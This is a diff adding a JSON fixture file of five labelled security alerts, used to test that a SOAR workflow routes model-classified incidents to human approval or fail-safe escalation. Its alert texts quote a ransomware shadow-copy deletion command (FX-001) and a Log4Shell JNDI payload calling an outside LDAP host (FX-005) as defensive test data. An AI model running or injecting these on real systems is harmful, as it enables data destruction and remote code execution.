@@ -1,0 +1,65 @@
+{
+  "_about": "Labelled branch-logic fixture for the SOAR gate. Each case is POSTed at the n8n webhook (same shape trigger.py sends: id/timestamp/host/title/description). The model classifies severity+confidence; the workflow routes to a branch; the gate asserts the audit-log branch equals expected_branch. Branch names match the workflow's terminal nodes: 'auto-escalate' (CRITICAL), 'require-approval' (HIGH), 'enrich-only' (MEDIUM/LOW), 'escalate' (AI unavailable/unparseable -> AI_UNAVAILABLE fail-safe). Anchor: Knight Capital (Aug 1, 2012) -- an autonomous system took an irreversible action at machine speed with no gate; ~$440M gone in ~45 min. The lesson encoded here: never let automation take an irreversible action on a low-confidence or model-down call. Labels are human judgment; you own them.",
+  "fixtures": [
+    {
+      "id": "FX-001",
+      "timestamp": "2025-05-22T02:35:00Z",
+      "host": "WKS-031",
+      "title": "Shadow copy deletion followed by mass file encryption",
+      "description": "vssadmin.exe Delete Shadows /All /Quiet executed by unknown process ransomware.exe, immediately followed by 847 files renamed with .locked extension in 30 seconds. Ransom note RESTORE_FILES.txt created in each directory. Real-time protection disabled.",
+      "severity": "CRITICAL",
+      "expected_branch": "auto-escalate",
+      "expected_decision": "auto_contain",
+      "expected_confidence_band": "high",
+      "rationale": "Unambiguous active ransomware encryption event -- high-confidence CRITICAL, auto-escalation is appropriate."
+    },
+    {
+      "id": "FX-002",
+      "timestamp": "2025-05-22T01:05:00Z",
+      "host": "FIN-03",
+      "title": "Outbound connection to known Tor exit node",
+      "description": "svchost.exe established a 42-minute outbound TCP connection to 185.220.101.42:443 (known Tor exit node). No established business justification. CrowdStrike confidence: HIGH.",
+      "severity": "HIGH",
+      "expected_branch": "require-approval",
+      "expected_decision": "escalate_human",
+      "expected_confidence_band": "high",
+      "rationale": "Likely C2, but containment (isolating a finance host) is irreversible at machine speed -- HIGH must route to a human approval gate before action."
+    },
+    {
+      "id": "FX-003",
+      "timestamp": "2025-05-22T07:20:00Z",
+      "host": "SRV-FILE01",
+      "title": "Scheduled backup completed",
+      "description": "Nightly backup of SRV-FILE01 completed successfully at 07:20 UTC. 142 GB written to the backup destination. No errors. Job matches the scheduled maintenance window.",
+      "severity": "LOW",
+      "expected_branch": "enrich-only",
+      "expected_decision": "no_action",
+      "expected_confidence_band": "high",
+      "rationale": "Clearly benign operational event -- enrich and queue, no containment, no escalation."
+    },
+    {
+      "id": "FX-004",
+      "timestamp": "2025-05-22T08:20:00Z",
+      "host": "FIN-09",
+      "title": "Ambiguous: unapproved browser extension with broad permissions",
+      "description": "Chrome extension 'PDF Converter Pro' installed by a user. Requests access to all website data and clipboard. Not on the IT approved list. No malware signatures detected and no observed malicious behaviour -- could be adware, a credential stealer, or a benign productivity tool.",
+      "severity": "MEDIUM",
+      "expected_branch": "require-approval",
+      "expected_decision": "escalate_human",
+      "expected_confidence_band": "low",
+      "rationale": "LOW-CONFIDENCE case: the alert is genuinely ambiguous. Even if the model emits a confident severity, a low-confidence call must NOT trigger an unsupervised action -- it routes to human review. This is the Knight Capital lesson: do not act irreversibly on a call you are not sure about."
+    },
+    {
+      "id": "FX-005",
+      "timestamp": "2025-05-22T04:15:00Z",
+      "host": "SRV-WEB02",
+      "title": "MODEL-DOWN: classifier unavailable / unparseable output",
+      "description": "FORCE_AI_FAILURE: this fixture intentionally drives the AI Classify node to fail (run it with Ollama stopped, or expect the parse step to fall through). A public-facing app server logged an inbound ${jndi:ldap://198.51.100.77:1389/Exploit} Log4Shell (CVE-2021-44228) request -- but the gate is testing the fail-safe, not the classification: when the model is down or returns garbage, the playbook MUST route to escalate / AI_UNAVAILABLE, never to the silent default no-action branch.",
+      "severity": "UNKNOWN",
+      "expected_branch": "escalate",
+      "expected_decision": "escalate_human",
+      "expected_confidence_band": "low",
+      "rationale": "MODEL-DOWN case: AI unavailable or output unparseable must fail safe to a human (status AI_UNAVAILABLE), never silently no-op. A silent default here is the Knight Capital failure mode -- no kill-switch between a broken decision and the action."
+    }
+  ]
+}
